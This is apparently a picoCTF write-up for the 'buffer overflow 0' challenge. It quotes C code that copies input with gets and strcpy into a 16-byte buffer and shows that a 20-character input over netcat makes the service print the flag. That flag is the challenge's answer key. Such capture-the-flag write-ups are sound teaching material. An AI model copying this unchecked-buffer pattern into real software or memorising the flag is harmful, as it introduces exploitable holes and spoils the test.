## Name: buffer overflow 0
#### Points: 100
#### Description: Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using: nc saturn.picoctf.net 55986
#### Files: `vuln.c`, `vuln executable`

We receive two files, and a netcat connection. We can choose to either execute the program outselves or use the netcat connection.

Using the netcat connection, we are prompted to type an input. Once an input is given, the program exits:

```console

â”Œâ”€â”€(gagrã‰¿desktop)-[/picoCTF2022/binary-exploitation/buffer-overflow-0]
â””â”€$ nc saturn.picoctf.net 55986
Input: hello
The program will exit now

```

Inspecting the code, the following snippet looks interesting:

```C
  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
```

What's important to note here is that the program uses `gets` to read input - this is because there are no boundary checks when using this function,
meaning that it is weak to a buffer overflow attack. Additionally, there is a custom method called `vuln` that also copies the input:

```C

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

```

In the same way as `gets`, the `strcpy` does not check for boundary violations, and thus is weak to buffer overflows. We can see that
there is a buffer with a maximum of 100 bytes defined, however, we do not need this many characters, since the `vuln` function is called, where
the input is copied into a buffer with 16 bytes. 

The result is that if we input more than what the buffer can hold, we should be able to overflow it. Inputting about 20 characters outputs
the flag ðŸš©:

<details>
  <summary>Flag [SPOILER]</summary>
  
  ```console
  
  â”Œâ”€â”€(gagrã‰¿desktop)-[/picoCTF2022/binary-exploitation/buffer-overflow-0]
  â””â”€$ nc saturn.picoctf.net 55986
  Input: AAAAAAAAAAAAAAAAAAAA
  picoCTF{ov3rfl0ws_ar3nt_that_bad_ee2fd2b1}
  
  ```
  
</details>
